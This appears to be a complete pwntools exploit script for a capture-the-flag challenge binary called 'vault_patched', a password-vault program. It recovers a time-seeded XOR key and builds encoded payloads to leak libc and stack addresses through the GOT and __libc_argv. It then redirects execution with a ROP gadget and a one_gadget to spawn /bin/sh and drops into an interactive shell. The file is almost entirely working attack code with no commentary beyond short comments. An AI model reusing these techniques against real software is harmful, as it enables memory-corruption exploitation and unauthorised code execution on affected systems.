#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
import time
from ctypes import cdll

context.log_level = 'debug'
exe = context.binary = ELF('./vault_patched', checksec=False)
libc = exe.libc
start_time = time.time()
c = cdll.LoadLibrary('libc.so.6')

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def u64(b): return packing.u64(b.ljust(8, b'\0'))

def log_leak(**kwargs):
    for name, value in kwargs.items():
        info(f"LEAK: {name:16} = {value:#x}")

def log_calc(**kwargs):
    for name, value in kwargs.items():
        info(f"CALC: {name:16} = {value:#x}")

def cmd(n, skip_prompt=False):
    if not skip_prompt:
        p.recvuntil(PROMPT)
    p.sendline(str(n))

def add_entry(pw, skip_prompt=False):
    cmd(1, skip_prompt)
    url = flat({0x80: b':'})
    p.sendlineafter('URL: ', url)
    p.sendlineafter(': ', pw)
    pass

# 0 is no leak, 1 is to leak r12, 2 to leak pw
def view_entry(idx, leak_any: int = 2):
    cmd(2)
    p.sendlineafter(': ', str(idx))
    if not leak_any: return
    if leak_any == 1:
        p.recvuntil('3. Exit\n')
        return p.recv(6, timeout=1)
    p.recvuntil('\nPassword:    ')
    pw = p.recvuntil('\n1. ', drop=True)
    # print('pw =', pw)
    return pw
    pass

# only one valid address to write due to strcpy
def gen_payload_from_r12(addr, key, offset=0, size=8, width=0xff):
    assert offset % 8 == 0
    assert offset + size < len(key)
    packed = pack(addr, size * 8)
    debug('packed: ' + packed.hex())
    xorred = xor(packed, key[offset:][:size]) + p8(key[offset + size])
    pw = b'a'*offset
    pw += xorred
    if any(x in BAD_CHARS for x in xorred):
        warn('bad chars: \n' + hexdump(pw))
        return None
    if any(x == y for x, y in zip(xorred[:size], key[:size])):
        warn('collide with key: ' + xorred.hex())
        gdb_pause()
        return None
    return pw.ljust(width, b'a')
    pass

def main():
    global p, PROMPT
    PROMPT = '> '
    i = 0
    while i < (16*2):
        exe.address = 0
        p = init()
        seed = c.time(0)
        c.srand(seed)
        key = bytes(c.rand()&0xff for i in range(0x40))
        print('key: ' + key.hex())

        # avoid noisy banner
        with context.silent: p.recvuntil('3. Exit')

        payload = gen_payload_from_r12(exe.got.puts & 0xffff, key, 0, 2)
        if not payload:
            p.close()
            time.sleep(1)
            continue
        add_entry(payload)
        view_entry(0)
        try:
            leaks = view_entry(0, leak_any=True)
            if len(leaks) == 6: break
        except Exception:
            pass
        p.close()
        time.sleep(1)
        i += 1
    else:
        log.error('bad luck')

    PROMPT = leaks
    puts = u64(leaks)
    log_leak(puts=puts)
    libc.address = puts - libc.sym.puts
    assert libc.address & 0xfff == 0

    log_calc(libc_base=libc.address)
    
    libc.sym['binsh'] = next(libc.search(b'/bin/sh\0'))
    # libc.sym['trap'] = next(libc.search(b'\xcc', executable=True))
    # libc.sym['main_arena'] = libc.sym.get('main_arena', 0)
    libc.sym['pop_3_regs_pop_rbp_ret'] = 0x44d40 # pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
    libc.sym['onegadget'] = [0xebd3f][0] # posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
    # os.system('/bin/rm -f core.*') # clear core files

    # leak stack
    payload2 = gen_payload_from_r12(libc.sym.__libc_argv, key, 0, 6)
    assert payload2
    add_entry(payload2, skip_prompt=True)
    view_entry(1)
    leaks = PROMPT = view_entry(1, leak_any=1)
    libc_argv = u64(leaks)
    log_leak(libc_argv=libc_argv)

    # overwrite view_entries rip to restart main
    magic = libc.sym.pop_3_regs_pop_rbp_ret
    payload3 = gen_payload_from_r12(magic, key, 0x20, 6)
    assert payload3
    add_entry(payload3, skip_prompt=True)
    view_entry(2)
    view_entry(2, leak_any=0)

    with context.silent: p.recvuntil('3. Exit')
    PROMPT = '> '

    ## calculate the new xorkey after restarting main
    enc2 = view_entry(0)[:0x40]
    assert len(enc2) == 0x40
    enc1 = xor(payload[:0x40], key[:0x40])
    key2 = xor(enc1, enc2)
    print('new key: ' + key2.hex())

    # prepare payload to onegadget
    payload4 = gen_payload_from_r12(libc.sym.onegadget, key2, 0x20, 6)
    add_entry(payload4, skip_prompt=True)
    view_entry(3)

    rbp_sub_0x70 = libc_argv - 0x70
    log_calc(rbp_sub_0x70=rbp_sub_0x70)

    # now overwrite rbx with [rbp-0x70]
    payload5 = gen_payload_from_r12(rbp_sub_0x70, key2, 0, 6, 0xff - 8)
    assert payload5
    add_entry(payload5)
    view_entry(4)
    view_entry(4, 0)

    # overwrite [rbx-0x70] with NULL
    cmd(libc.bss(0x1000) & 0xffffffff)

    # now [rbx] = main rip = gets
    # view_entry(2) again to jmp to onegadget
    p.sendlineafter(': ', str(3))

    pass

while True:
    try:
        main()
        break
    except Exception as exc:
        warn(f'Fail with the follow reason: {exc}')
        warn('retrying ..')
        pass
    continue

try:
    # main()
    if hasattr(p, 'pid'): print(f'pid = {p.pid}')
    # win()
    # p.shutdown()
    p.interactive()
except Exception as exc:
    raise exc
